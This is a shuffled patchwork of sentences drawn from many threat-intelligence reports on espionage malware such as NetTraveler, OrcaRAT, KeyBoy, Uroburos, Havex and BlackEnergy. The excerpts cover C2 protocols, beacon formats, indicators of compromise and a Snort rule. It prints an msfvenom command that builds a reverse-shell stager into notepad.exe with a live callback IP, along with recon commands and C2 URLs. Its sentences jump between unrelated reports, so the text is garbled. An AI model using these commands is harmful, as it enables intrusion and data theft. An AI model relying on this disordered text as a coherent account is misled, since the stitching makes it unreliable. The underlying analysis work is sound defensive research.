After that it will connect to the Command and Control ( C2 ) server and fetch updated modules by the following URLs : http : // < server name > / < filename > , where < server name > is a value from tv.cfg file ( newslite.org ) .
Its main purpose is to collect general system information , including what software is installed , what services and processes are running on the system , information about available local storage and its free space , user accounts and BIOS information .
In addition to these attacks , we discovered a number of other command and control servers used by attackers which employ the Teamviewer-based attack toolkit .
Its main purpose it to list all new network servers and available network shares .
The module concatenates a string to run a command with cmd.exe : cmd.exe /c wmic os get /format : HFORM > % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll155.html & & wmic bios list /format : HFORM > > % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll155.html Execution of the commands above concatenates two HTML reports which contain two tables with information about running OS and computer 's BIOS .
iexplore.exe ( compiled Thu April 08 12:14:44 2010 ) MD5 : 512c13c374cdaabb00bf98256872c813 Kaspersky name : Trojan-Spy.Win32.Ardamax.dmn Sends stolen information to hxxp : //www.politnews.org/dd_4.php , hxxp : //www.bannetwork.org/dd_4.php iexplore.exe ( compiled Thu March 04 17:44:44 2010 ) MD5 : 76c33bf350ca7447730e8a37f2d93000 Kaspersky name : Trojan-Spy.Win32.Ardamax.dkm Sends stolen information to hxxp : //www.politnews.org/dd_4.php , hxxp : //www.bannetwork.org/dd_4.php iexplore.exe ( compiled Tue Feb 08 06:58:58 2011 ) MD5 : be612d16b07c59d22b47f9313c44437c Kaspersky name : Trojan-Spy.Win32.Ardamax.mei Sends stolen information to : hxxp : //www.politnews.org/dd_4.php , hxxp : //www.news-top.org/dd_4.php Kaspersky Security Network is Kaspersky ' cloud security services .
In parallel a new thread is created , which waits for a signal to search *.bin files in the module directory , encrypt with szlogkey value from tv.cfg using RC4 algorithm and upload to the FTP server specified in the tv.cfg .
* They then checked the RAR archive , uploaded it to the CnC server , and deleted the archive from the compromised system : • dir % temp % /tem.rar • del C : \DOCUME~1\ [ REDACTED ] \ [ REDACTED ] \Temp\tem.rar During our window of visibility , FireEye found evidence that the attackers were able to enumerate the various target networks , move laterally to compromise new systems , and finally to gather information that was compressed and uploaded to the CnC server .
Once a compromised system connects to the CnC server , the Ke3chang attackers follow a predetermined script .
The network communication is actually performed through the browser process , causing some misdirection when it comes to determining which process is ultimately responsible for generating this network traffic .
When FireEye had visibility on the CnC server , we saw the attackers engage in post-compromise information gathering and lateral movement on the target network , where upon FireEye immediately contacted the relevant authorities and began the notification process .
MyWeb only encrypts the command results data sent back to the CnC server using the same weak encryption algorithm as BS2005 ( see Figure 2 ) .
The < X Bytes > data indicates the number of bytes last downloaded from the download file command .
This malware is known as BMW , due to the presence of this PDB string : BMW sample ( 649691e1d367721f0ff899fd31133915 ) beacons to CnC mail.yahoo.sendsmtp.com with the following fake HTTP traffic : The < filename > in the URI is randomly chosen from one of the following hard-coded entries within the malware binary : • acheb.aspx • bajree.aspx • cyacrin.aspx • dauber.aspx • eaves.aspx The Base64 encoded data in the POST body decodes to the following : The < Y/N > data indicates whether the malware is running inside a virtual machine .
Various versions of the BS2005 malware will use a different constant for the addition part of the encryption routine and contain other information , such as the following : • Installed mail client • Internet Explorer version • Windows version • Whether a proxy server is configured • Whether a virtual machine was detected In addition to the Base64 data in the URI of the HTTP POST , the BS2005 malware also includes Base64 data in the body of the HTTP POST .
Improvements in the BS2005 version of the malware include a `` sleep until date/time '' command and weak encryption for all CnC data ; previous iterations ( MyWeb and BMW ) did not encrypt the host information sent in the beacon .
When executed , the BS2005 malware connected to a CnC server with the following HTTP traffic pattern : The CnC server 's hostname in this case contains the string `` g20news '' ; because of this , FireEye believes that the targets of the `` snake '' campaign may have been related to the G20 finance ministers meeting held in Paris , France on October 15 , 2011 .
The `` msfvenom '' tool transmogrifies a Metasploit payload into a standalone EXE , and with the `` -x '' switch , it 'll fuse the payload- -encoded as desired -- into a copy of an existing executable , exhibiting exactly the behavior we just described .
One conclusion Brian proposed is that they 're intended as backdoors -- replacements for the legitimate Notepad on a compromised system -- which would enable Cleaver to regain access to a system at some indeterminate time in the future , the next time a user runs Notepad .
) Here is its behavior summarized as function calls : The above is known to be true for Notepad3.exe , Notepad4.exe , and notepad10.exe .
Something along the lines of `` msfvenom -x notepad.exe -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe '' .
The image below depicts some byte differences between the original Windows 7 Notepad and samples NOTEPAD2.EXE and Notepad3.exe : At the Portable Executable ( PE ) level , these differences translate to changes in the files ' timestamps ( IMAGE_NT_HEADERS.FileHeader.TimeDateStamp , offset 0xE8 in the figure above ) , the relative virtual addresses ( RVAs ) of their entry points ( IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint , offset 0x108 ) , and their checksums ( IMAGE_NT_HEADERS.OptionalHeader.CheckSum , offset 0x138 ) .
All around them was a clutter of credential dumps , hacking utilities , RATs , and even legitimate software installers , but the files in question were none of these .
The files in question were found in a dim and dusty directory on a forlorn FTP server in the US , commingled with the detritus of past attack campaigns and successful compromises .
( Spoiler : it 's actually a Metasploit reverse connect stager .
This makes sense as a general precaution , considering that corrupting the import directory would unhelpfully crash the Windows loader during process initialization .
another decoding stub : Here , the first byte to be XORed is the second byte of the LOOP instruction , hence the nonsensical destination apparent in the pre-decoding disassembly above .
The exploit drops > > % temp % \netmgr.dll > > % temp % \netmgr.exe > > % temp % \perf2012.ini > > % temp % \sysinfo2012.dll > > % temp % \winlogin.exe The malware command and control server script is at `` hxxp : //www.faceboak.net/2012nt/ nettraveler.asp '' .
The module main purpose is to install and embedded DLL file or load it during system startup .
Thread1 ( Command and Control Thread ) This thread starts from collecting local system information , including the following : This information is stored in a text buffer with Chinese comments like shown below ( transla- tion is added in red ) : Physical Memory : Total physical memory : ***MB of available memory : ***MB ( ** .
The malware uses compression techniques and a fail-safe protocol to ensure that uploaded data is safely transferred to the attacker 's C2s .
The main function of the C & C script saves stolen data to a folder in the C2 root , unless the request variable `` action '' is defined , in which case , it performs one of the following commands : The Command and control scripts reply to the victim with either `` Success : < size > '' or `` Fail ! `` , de- pending on the result of the operation .
The command and control servers generally run IIS 6/7 , as the C2 backend is an ASP ( Microsoft Active Server Pages ) script .
This produces logs like the following ( in decoded format ) : The command and control scripts implement several functions to communicate with the victim ; during our analysis , we observed four different generations of these scripts , with various degrees of complexity .
Drive monitoring disk processing issue As we mentioned above the drive monitoring thread uses the same function to process removable USB drives and network shares attached as local drives .
This module also drops an INI-type file with the configuration that is later used by the NetTrav- eler backdoor .
Stolen data is stored in the exact format it was sent from the victim 's PC , without any additional encoding or obfuscation .
After a command and control message is received , OrcaRAT sends an HTTP POST message back to the command and control server .
Given the command structure above , it is logical to assume that the command and control server requires an operator to manually issue specific commands to the victim workstation , with the default command likely being 'sleep ' .
Once all of the values have been encrypted and formatted the URI has the following structure : ( A screenshot showing the URI structure of OrcaRAT command and control activity ) The campaign ID value is constructed using a method similar to that for the encryption key .
Each branch of command and control activity is determined by the unique response from the remote server .
Each time that the URI is built it generates a new encryption key , showing that the command and control server is at least serving dynamic content .
Firstly we begin by analysing the routines that produce the data which is later encoded and sent in the HTTP URI field .
We will now investigate the mechanisms that the server uses to communicate and interact with the victim .
( A screenshot showing the structure of the command and control routines within OrcaRAT ) The command and control structure is fairly simplistic but provides the operator with access to the victim machine 's filesystem and command line , and as such allows the attacker to perform various tasks such as executing arbitrary commands or uploading and downloading files from the compromised system .
Once the payload text has been decrypted the malware treats this as a binary executable file , which is then written to the disk and executed .
Once the malware has found these tags it drops in to the first command and control function .
After the configuration file is written , it checks if the malware was previously installed or not , if not , it creates a dynamic-link library in the `` system32 '' folder , creates a temporary batch file named as `` temp.bat '' which installs the previous DLL as a service on the system .
Our analysis is currently focussed only on the malware samples that are dropped on the target systems , as the exploits used during the spear-phishing campaign are older & already patched by the respective vendors .
The contents of both the files are as follows : Filename : AllIndex.ini Filename : AllIndex.ini_d It 's pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following image : Apart from that , this variant also creates a file that lists all the currently running processes on the victim machine , into a text file named `` Process.dll '' inside the currently logged-on user 's `` temp '' folder .
The name of the DLL that is created , is based upon the values of the data from `` netsvcs '' from the following registry key : `` HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost '' .
Another important aspect of Travnet is the fact that it uses a custom compression & encoding algorithm on the data collected , before its sent to the remote C & C .
Now , as we know already , this DLL was installed as a service by the previous dropper .
Next step is to compress the contents of this file , copy the compressed content to a new file named as `` AllIndex.ini_d '' & then delete the previously created clear-text file .
To summarize , the Travnet malware initially collects system information , a list of files on the victim machine among others , then sends this data to the remote Command & Control ( C & C ) server , by using custom compression & encoding functions .
It just makes a list of all files & folders on the victim machine & dumps it into a file named as '' AllIndex.ini '' .
The only other major difference from the previous variant is the fact that this one only supports 2 commands from the remote C & C server , instead of 4 & they are as follows :  Uninstall  Upload The C & C server in case of this variant was located at : `` http : //www.viprambler.com/newsinfo/uld/nettraveler.asp '' Apart from analyzing the malware samples , we also tried to gather as much information about the C & C servers as we could .
- Creates and maintains client network connections to remote server using the SMB protocol MBR destruction is done through a 'number ' value of the registry key value of the items checked below ( `` 0 '' if the destructive behavior than the largest value ) is set to '0 ' value at the time of initial infection .
MD5 and V3 diagnostic information on malicious files identified vulnerability Hangul file and generated by the current is as follows .
% System % registered the generated DLL as a service to the folder / drive upon , information that is used has a list on the inside of malicious code , and select one of the items below at random .
The following [ Figure 5 ] After MBR infection , a screen visible to the user reboots .
- The Wired AutoConfig ( dot3svc ) service is responsible for Performing IEEE 802.1X - The WLANSVC service Logic Provides the Required to Configure , Discover , Connect to , and disconnect from a Wireless local Area network .
Destroy the target file identified to date are : Locate the files with the extension of the above 'A ' ~ 'Z ' drive changes and performs a process to fill a NULL value to 4096 bytes ( 4K ) size .
- Enables Windows-based Programs to create , Access , and modify Internet- Files based .
Infection , 'A ' ~ 'Z ' , the same process is repeated for all the drives .
- Enables Installation , modification , and Removal of Windows updates and Optional Components .
The following [ Figure 4 ] is overwritten with the contents of the MBR code , and has the ability to output the string during boot `` Who Am I ? '' .
If the request and the Via field exist , the server variant authenticates the client and responds with HTTP/1.0 200 Server : Apache/2.2.3 ( Red Hat ) Accept-Ranges : bytes Content-Type : text/html Proxy-Connection : keep-alive If the client 's request does not meet the appropriate authentication criteria , the server variant sends : HTTP/1.0 400 Bad Request Server : Apache/2.2.3 ( Red Hat ) Connection : close With a communication channel between the server variant and the client established , the server sends information about the victim 's computer .
Failing this , the mainLoop determines if the victim 's machine is running the 360 antivirus product by looking for a process with the name ZhuDongFangYu.exe .
The driver , after hooking the firewall using either of the two mentioned interfaces , will inspect incoming network packets .
PCC_FILE : :ProcessPacketEx performs no file management operations but instead adds any incoming command packets to a queue for processing by PCC_FILE : :ReadWaitingData if the packet is not already within the queue ( thus avoiding duplication of commands ) .
The server variant utilizes a device driver in order to hook into the Windows firewall by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later .
Presumably a failsafe if the driver is unable to load , the secondary method requires the client to send a POST request with the following form : POST /forum/login.cgi HTTP/1.1\r\n In addition , the POST request must contain a Via field .
The port number is sent to the driver ( via IOCTL 0x220200 ) in order to inform the driver where to redirect incoming traffic .
The device driver inspects incoming network traffic from any client connecting to the victim machine , determines if an appropriate handshake packet occurs at the beginning of a new TCP session , and then makes the decision to reroute the network traffic to the Derusbi malware or let the traffic continue unaltered to its original service .
Depending on the version of the victim 's OS , the driver will hook the Windows Firewall by either using the surprisingly undocumented IOCTL_IP_SET_FIREWALL_HOOK command of the \\Device\IP device for Windows XP or older machines or by using the documented Windows Filtering Platform ( WFP ) found in Windows Vista and later .
If the process is running , the driver is not installed but the mainLoop continues regardless .
Based on this , the malware has likely modified the system registry on the compromised computers in such a way that the RAT gets executed as a service by the trusted process 'svchost.exe ' each time the computer is started .
After sending the detailed beacon to the command and control server , the compromised computer appeared to expect a response from the server .
It provides options to digitally sign the malware , specify its connection mode ( connect/listen/sniff ) , install the malware in one of several covert manners , recover the System Service Dispatch Table ( SSDT ) before installation , and abort installation if a virtual machine is detected .
X­Shell configuration webpages contain , in encoded form , a colon­separated IP address ( or callback domain ) and port for the malware to use to communicate with its C2 server .
Optional features include encrypted file search , an SMS notification service , and functionality that enables the compromised computer to be used as part of a botnet to send spam or to conduct distributed denial of service attacks .
The data sent to the C2 server is dependent on the C2 instructions received .
Data contained within the communications indicated that the requests were all sent from a single computer , and therefore that computer was not using a static IP address .
While most malware uses the local DNS server settings of the compromised computer to resolve its callback domain to an IP address , in some observed communications the attackers appear to have specifically chosen the DNS servers .
If this option is selected , the malware communicates with both a configuration webpage , and a C2 server at regular intervals .
The malware located its C2 server ( s ) by resolving these domains into IP addresses using the ubiquitous Domain Name System ( DNS ) protocol .
These backdoors provide a persistent foothold , using a separate command and control channel ; allowing future access less likely to be correlated to the original activity .
Cross-Platform Frutas RAT Builder and Back Door , Feb 2013 : http : //www.symantec.com/connect/blogs/cross-platform-frutas-rat-builder-and-back-door 6 .
One simple example of how the emails in this phishing campaign are related is that the Command and Control node ( 184.22.201 [ .
It has some of the following capabilities : In the past , variants of the DarkComet and AcromRAT malware have also been observed beaconing to the same Command & Control ( CnC ) servers used by the Unrecom RAT in this campaign .
We find it interesting that on their website , the authors of this software recommend Unrecom RAT buyers to not scan created servers ( malware deployed to Victim systems ) at Virustotal nor Metascan .
Unrecom RAT provides the attacker with full control over the compromised system , once infected .
The following will present detailed information about some of the phishing emails observed and the attached malware : The `` Invitation.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` Invitation.jar '' malware beaconed to `` magnumbiz.no-ip [ .
] 27 ) that the malware communicates with is shared by two separate phishing emails in this campaign , as shown in the diagram below .
A remote access tool provides an attacker with full control over the victim system .
The `` DBC_BANK_IMG_23456_156.jar '' malware is a corrupted file , but it was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` lremit_Transfer_Error_Page.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : `` Iremit Transfer Error Page '' , in the above email , has a link pointing to `` http : //radaxis [ .
Following are the hashes of the exploit file : THAM luan- GD- NCKH2.doc When executed the exploit initially creates and launches a dropper at location % Temp % \svchost.exe with the following hashes : svchost.exe This payload then creates a DLL file in system32 called CREDRIVER.dll , which is in fact the actual backdoor : CREDRIVER.dll We also identified another document exploiting CVE-2012-0158 , but this time apparently targeting some Indian individuals .
You can easily decode the content of the payload with the following Python snippet : The previous packet decodes to the following : $ login $ LAB 192.168.56.101 MyUser 2013/06/06 23:56:24 Proxy 20130401 While reverse engineering the backdoor we noticed that the malware expects the following messages from the C & C server it contacts : Sysinfo FileManager Download UploadFileOk Shell Intrigued by its capabilities , we started reconstructing the communication protocol and practically building a tool that would operate just like the original controller used by the attackers .
Firstly , thanks to the fixed patterns used by the malware in the authentication procedure , we can detect outbound traffic from infected hosts with the following simple Snort rule : alert tcp $ HOME_NET any - > $ EXTERNAL_NET any ( msg : '' KeyBoy Backdoor Login '' ; flow : to_server ; content : '' |c4 4c 87 3f 11 1e c4 1a| '' ; depth:8 ; sid:1000001 ; rev:1 ; classtype : trojan-activity ; reference : url , community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar geted-attacks- against-vietnam-and-india ) The simplest way to identify an infection on a given Windows system , is just to look for the existence of the file C : \WINDOWS\system32\CREDRIVER.dll or of a service called MdAdum .
Operate in an interactive mode to allow the attacker to perform additional investigation on the compromised system and exfiltrate data .
Install a keylogger for intercepting credentials on Google Chrome 4 .
Most interestingly the command Shell spawns a Windows command shell that we can control remotely : shell > Shell $ shell $ Microsoft Windows XP [ Version 5.1.2600 ] ( C ) Copyright 1985-2001 Microsoft Corp. C : \WINDOWS\system32 > shell > tasklist $ shell $ tasklist $ shell $ C : \WINDOWS\system32 > While the interaction with the bots could also be scripted , it might be plausible that the operators of these intrusions might be interacting with their targets exclusively manually to collect different data depending on each individual they infected and the goals they had set for the attack .
Steal credentials from Internet Explorer 2 .
In older versions of Firefox , credentials were stored in several .txt
In the following snipped you see the SQL statement to extract the data : Just in the same way , the backdoor attempts to collect password autocomplete from Internet Explorer : The backdoor also creates a separate thread that installs a Windows hook procedure on message WH_KEYBOARD_LL , through which it can intercept keystrokes .
Following are traces collected from passive DNS data relevant to the hosts involved in these attacks : This is an initial request that the backdoor would send out on port 443 to an active C & C : 00000000 c4 4c 87 3f 11 1e c4 1a 2c a9 12 1a 19 61 82 de |.L .
Reactor ( http : //www.eziriz.com/ ) This document provides details of the njRAT campaign codes used , versions , ports , and CnC nodes currently observed sending commands to victim systems .
`` njRAT '' is a robust remote access trojan ( RAT ) which upon reaching and infecting an end-point , allows the attacker to have full control over the victim system .
Among other things , with this access , the attacker could start scanning other systems in the victim network to perform lateral movement .
To this day , we continue to observe waves of blunt phishing attacks from compromised hosts in the Middle East , showing threat actors using multiple tools ( including njRAT , AdwindRAT , Xtreme RAT , and H-Worm ) in clustered phishing attacks against the same targets .
Additionally , we continue to directly observe significant activity from threat actors sending commands to the victim systems in the Middle East .
Some of these attacks continue to target the U.S. telecommunications sector with threat actors sending phishing emails using business-oriented lures containing the aforementioned tools or links to websites that serve these tools .
( http : //www.fidelissecurity.com/threatadvisory ) .
( http : //www.pelock.com/products/netshrink ) -­‐ Confuser v1.9.0.0 ( http : //confuser.codeplex.com/ ) -­‐ .NET
Further , we are observing attackers using the following obfuscators to make detection of this malware specimen more difficult for security analysts : -­‐ .NetShrink
Fidelis XPS™ detects all of the activity documented in this paper .
Our network forensic analysis was performed by investigating the following to packet capture files : The analyzed capture files contain pure IPv6 traffic ( CERNET is a IPv6 network ) which made the analysis a bit different then usual .
The evidence we 've observed instead indicate that the MITM attack is performed either by performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy .
The round-trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server .
An alternative to changing the router config would also be to add an in-line device that redirects the desired traffic to the SSL proxy .
Even though the machine performing the MITM was very quick at performing the TCP tree-way handshake we noticed that the application layer communication was terribly slow .
This network is actually part of CERNET , but on AS23911 , which is the network that connects CERNET with its external peers .
A reasonable assumption is therefore that the MITM is carried out on the 2001:252 : :/32 network , or where AS23910 ( 2001 : da8:1 : :2 ) connects to AS23911 ( 2001:252:0:1 : :1 ) .
Certificate SHA1 fingerprint : f6beadb9bc02e0a152d71c318739cdecfc1c085d Certificate MD5 fingerprint : 66 : D5 : D5:6A : E9:28:51:7C:03:53 : C5 : E1:33:14 : A8:3B A copy of the fake certificate is available on Google drive thanks to GreatFire.org .
We extracted the X.509 certificates from the two capture files to .cer
Thursday , 04 September 2014 23:55:00 ( UTC/GMT ) The Chinese are running a MITM attack on SSL encrypted traffic between Chinese universities and Google .
) When the DLL first runs , it installs itself permanently into two places on the victim 's computer : • C : \Documents and Settings\All Users\Application Data\Microsoft\ Windows\Burn\ % COMPUTERNAME % .dll
After infecting your computer , the shellcode loads a new copy of Word to display a decoy document that is hidden inside the malicious file .
This component decodes the Command-and-Control ( C & C ) server names that the final malware will use , and saves them to the registry entry HKCU\Software\ Microsoft\Windows Media\XC .
Fig 5 : Smoaler registry entry used to store C & C server names After storing the C & C names in the registry , the intermediate infector loads the dropped DLL using the LoadLibrary ( ) Windows API call .
• Shellcode is runnable program code delivered inside a file that is supposed to be plain data , and therefore implicitly safe , but that can be executed without the user 's knowledge or consent by exploiting a vulnerability .
As with PlugX , the Smoaler files arrived with Tibetan-themed subject lines : If you open an infected document on an unpatched , unprotected computer , the shellcode in the document will activate and run .
It locates this in its own executable file , drops it to disk ( which is where the name dropper comes from for this sort of malware component ) , and runs it .
) • C : \Documents and Settings\All Users\Application Data\Microsoft\ Windows\LiveUpdata_Mem\ % RANDOM % .dll
Putting the C & C server names in the registry , rather than in the zombie executable itself , means that if the user becomes suspicious and submits the malware file to a security vendor , the locations of the C & C servers will not be revealed .
While running , however , Smoaler keeps a lookout for processes called vsserv.exe , fsdfwd.exe , AvastSvc.exe , uiWatchDog.exe , and avp.exe .
The downloaded `` JPG '' file was analyzed to be a backdoor in the victim 's machine .
Interestingly , we have found another spear phishing document that downloads malware which incorporates improved mouse click detection anti- sandboxing capability .
Overall , this malware was observed to send information about the computer and set up a backdoor for remote access .
URL : hxxp : //kibber.no-ip.org/adserv/logo.jpg User-Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ; SV2 ) After the JPG file is downloaded and executed directly in the memory , it achieves persistency by creating a shortcut link file at the start up folder .
By following the TCP stream ( see Figure 12 ) and examining the header of the downloaded JPG file , it is obvious that downloaded content is not a JPEG file .
The spear phishing document was in RTF format which as designed loads MSCOMCTL.ocx and exploits CVE 2012-0158 .
This backdoor provides the attacker the flexibility on how malicious activities could be executed .
Instead it requires an Internet connection for malicious code to be downloaded to the memory and executed .
The callback goes to a legitimate URL : Often when malware performs its callback , the communication goes directly to the CnC server .
Command 'g ' : Download and execute a file .
The good news is that if an entity is actively patching Windows PE files for Windows Update , the update verification process detects it , and you will receive error code 0×80200053 .
Since the user , not the automatic update process , is initiating these downloads , these files are not automatically verified before execution as with Windows Update .
In addition , these files need administrative privileges to execute , and they will execute the payload that was patched into the binary during download with those elevated privileges .
If you follow the three steps from the official MS answer , two of those steps result in downloading and executing a MS 'Fixit ' solution executable .
Exitmap is Python-based and allows one to write modules to check exit nodes for various modifications of traffic .
I tested BDFProxy against a number of binaries and update processes , including Microsoft Windows Automatic updates .
The file was truncated during download .
By using a wrapper for the original binary , the malware authors do not invoke the NSIS error and bypass simple self-checking mechanisms .
The file was patched during download .
Windows Update produces this error code for three root causes : 1 .
This backdoor also has functionality to load additional plugins from the command and control server .
If the CPU core check detects more than one core , it implants the NewCT2 RAT in % temp % \MSSoap.DLL ( some variants will use BurnDCSrv.DLL and IntelAMTPP.DLL ) and executes the written file .
The command and control server in question was located at 58.64.201.229 .
] com served as a command and control server for Mongall payloads distributed by the DragonOK group .
Additionally , the Moafee group also hosted a PoisonIvy command and control server at phi .
• Usage of the same evasion techniques to evade detection such as environment checks based on CPU cores , password protected documents , and the use of large null padded files .
It exports the following two functions : SendData CreateInstance It creates a mutex `` HFRM_ '' to ensure there is only one running copy of the backdoor .
One of the command and control servers used by a variant of this implant is aptly named `` ct.datangcun [ .
The implant has persistence mechanisms and contains functionality to perform command and control communication .
This implant has the following beacon format : GET /el/sregister.php ? name= [ REDACTED ] HTTP/1.1 User-Agent : Mozilla/5.0 ( compatible ; MSIE 10.0 ; Windows NT 6.1 ; Trident/6.0 ) Host : 122.10.62.137 Connection : Keep-Alive Other URI formats include : /el/slogin.php ? uid= /el/suploadfile.php ? item= /el/suploadfile.php FireEye has previously analyzed this backdoor , which is used by multiple other groups in addition to DragonOK and Moafee .
The media type of the request is chosen from the following list :  ICMP protocol the attackers can choose to use ICMP ( ping ) to exfiltrate data  SMTP protocol the attackers can send exfiltrated data by email  Named pipe the attackers can use Microsoft 's named pipe to communicate to another infected machine .
It can spy on each and every infected machine and manages to send the exfiltrated information back to the attackers , by relaying this exfiltrated data through infected machines to one machine with Internet connection .
This information can be used to perform `` pass the hash '' 2 attacks , to compromise new systems within the infrastructure  information gathering tools , to get information on the infected system  RAR tools , to create archives of stolen documents  Microsoft Office document stealer  … The driver injects several libraries into user land .
The rootkit is able to take control of an infected machine , execute arbitrary commands and hide system activities .
 HTTP protocol the attackers can choose to use a website to exfiltrate data .
By commanding one infected machine that has Internet connection , the malware is able to infect further machines within the network , even the ones without Internet connection .
Uroburos is designed to work in peer-to-peer mode , meaning that infected machines communicate among each other , commanded by the remote attackers .
The driver uses inline patching to perform the hooks , which is a common way to perform this task .
They are stored locally , on the infected machine .
The libraries are furthermore used to exfiltrate data to the outside world , namely the attackers .
That email contained a malicious excel �le , which once opened and its VBA code executed , would infect the victim 's computer .
Logs and proxy servers should be checked for communication with the IP addresses with which the malware communicates : 83.170.33.60 83.170.33.37 If you think you got infected , check in the system root folder for a �le called NTUSER.DAT .
In this report we analyze one case of an operation protective edge themed spear phishing attack .
The �le name is `` svchost 67.exe '' ( MD5 : 916be1b609ed3dc80e5039a1d8102e82 ) and it was uploaded to Virus Total [ 5 ] on 2 June 2014 , more than two months earlier than `` Operation Protective Edge.xlsb '' .
'' [ 1 ] This is a social engineering tactic meant to lure the victim into enabling Macro content .
[ 10 ] [ 11 ] Certi�cate Fingerprint MD5 : 9C 80 C2 47 40 6D 6C ED FC E0 08 AE EF D9 98 90 Using a proxy and SSL stripping , the following communication pattern over HTTP can be seen : GET /index.php ? c=Ud7atknq & r=17117d HTTP/1.1 POST /index.php ? c=Ud7atknq & r=1710b2 HTTP/1.1 Searching for speci�c strings from the malicious �le , we found another �le that we believe is related to this campaign .
`` svchost 67.exe '' communicated with 83.170.33.37 , which is on the same /26 netblock as the address `` Operation Protective Edge.xlsb '' is commutating with .
( MD5 : 48573a150562c57742230583456b4c02 ) and the function ShellExecte is used to run it under cmd.exe /C and Rundll32 This is in order to hide the process .
Analysis of the Macro code reveals the following structure : In order to avoid detection by protection measures such as computer antivirus and intrusion detection systems , ASCII characters codes are used instead of actual characters .
This time it was detected as malicious only by Kaspersky , as Trojan- Dropper.MSExcel.Agent.ce .
It does not have a driver component and the installer drops the main DLL component directly to the local application data ( non- roaming ) folder .
The response of the command and control server will be encrypted using the id field in the POST request as the key .
We believe they are either dropped by another executable that uses social engineering tricks to mislead the user into executing the installer , or by documents containing exploits that silently perform the installation .
These documents drop and execute the installer , then open a decoy document .
The toolkit also comes with server-side scripts , which the attackers set up in the command and control ( C & C ) server .
We found at least 2 trojanized legitimate applications that execute the installer ( in addition to their legitimate tasks ) .
Given the nature of its toolkit , BlackEnergy has unsurprisingly been used by different gangs for different purposes ; some use it for sending spam , others for stealing banking credentials .
We also encountered a standalone , non-persistent sample that pretends to be Adobe Flash Player Installer .
In contrast to previous variants , BlackEnergy 3 uses a simpler installer component .
The installer will drop the driver component using the corresponding path of the service .
While it appears that the attackers used spear-phishing ( via email ) , their primary technique was the use of a `` watering-hole '' attack whereby they attack websites known to be frequented by the target using techniques such as SQL injection , and upload malicious files to these website .
Symantec believes that the exploits were packed with a Trojan and Command & Control ( C2 ) server address using a platform that gives the group its name : `` Elderwood .
By extension of these occurances , it may be concluded that a capable attacker could manipulate safety control systems of an oil rig from shore , and do so through a sophisticated control system virus which can operate even when not in contact with a C2 server .
Purpose : Exfiltration of `` a historically unprecedented transfer of wealth-closely guarded national secrets ( including those from classified government networks ) , source code , bug databases , email archives , negotiation plans and exploration details for new oil and gas field auctions , document stores , legal contracts , supervisory control and data acquisition ( SCADA ) configurations , design schematics , and much more '' Entry Method : Spear Phishing Countries with Companies Affected : U.S. Synopsis : Dell SecureWorks gives a fairly good collection of technical details about the campaign they 've dubbed `` Mirage '' for the string used to connect to the C2 server by the Remote Access Trojan , but largely they focused on studying the tool , not monitoring the APT activity .
From here they could have stolen credentials or otherwise escalated privileges to gain access to the safety systems on the Deepwater Horizon and other rigs operating in the area .
Perhaps the most convincing piece of evidence as to the origins of the attack is what appears to be a notification released by Telvent which identified malicious files and domains used for Command and Control ( C2 ) .
Upload RAT malware to exfiltrate sensitive data 5 .
Purpose : `` gather intelligence from the compromised organizations '' Entry Method : Social Engineering , Spear Phishing , SQL-injection of web servers Countries with Companies Affected : Azerbaijan , Belarus , Turkmenistan , UAE Synopsis : The APT1 Report is perhaps the most detailed report to date .
Not only was the malware difficult to detect , but it was planted using spear-phishing methods that targeted mid to high level executives .
Spear phishing : The process of attempting , often through email , to acquire someone else 's user information .
In order to do that , the malware injects itself into the EXPLORER.EXE process , sends a GET/POST request to the PHP script on the compromised website , then reads the HTML document returned by the script , looking for a base64 encrypted data between the two `` havex '' strings in the comment tag < ! -- havexhavex -- > and writes this data it to a % TEMP % \ < tmp > .xmd
The RAT gets its commands by sending a request to a PHP script on the C & C ( compromised server ) as usual , and looks for specific data in the returned HTML code .
Besides backdoor functionality , it also extracts credentials from Internet Explorer 's password manager to the prx.jpg file and injects a small DLL into the processes of web browsers .
All harvested data is compressed , encrypted and written into the % TEMP % \*.yls files , which are then sent to the C & C by the main Havex/Sysmain module .
After checking if a connection to the Internet is up , it sends an initial POST request to the C & C server .
• `` testlog.php '' is not a PHP-script but it contains the C & C Server logfile of Backdoor- connections .
They used dozens of compromised servers as Command and Control domains with a simple , but effective , PHP backend .
The first method uses a legitimate software installer repackaged to contain the malicious DLL .
Write the above information to `` testlog.php '' , separated by `` Tabulator '' and base64- encoded , with the following syntax : < timestamp > \t < victim ip-address > \t < proxy > \t < botID > \t < request-uri > \t < useragent > 3 .
This exploit drops the Havex loader DLL , which is stored in an encrypted form in the XDP file .
Sample B is identiﬁed to be a HTTP controlled backdoor , enabling the attacker to take full control over the victim computer .
A full request looks like : The user agent is always Sent accept headers are : The malware creates in a value 'AppID ' with the data it calculates from GetTickcount ( ) , used as an identiﬁer/mutex .
We assume the ﬁle is only dropped and/or executed on request via stage 2 of Miniduke and not running persistently .
The analysis of Sample B revealed the commands as shown in table 1 The attacker controls the remote computer via HTTP GET and POST requests like the following : The request is encoded in a custom BASE64 encoding , using the following alphabet : The malware connects via HTTP GET and POST requests to and the path is ﬁxed : The variable part is the custom BASE64 encoded string corresponding to `` i= '' .
Sample B , contained in Sample A , can be categorized as an exhaustive backdoor , implementing any kind of functionality that can be expected for this kind of attacks .
That 's why we updated this document to include a graph of the loader : Decryption of module and function names Command `` exec '' - standard process creation : Command `` exeu '' - process creation in a domain environment The domain news.grouptumbler.com is currently resolving to 173.194.70.101 Before that date , the IP was 200.63.46.33 The IP 200.63.46.33 was hosting the following domains : None , some or all domains in this list might be malicious as well .
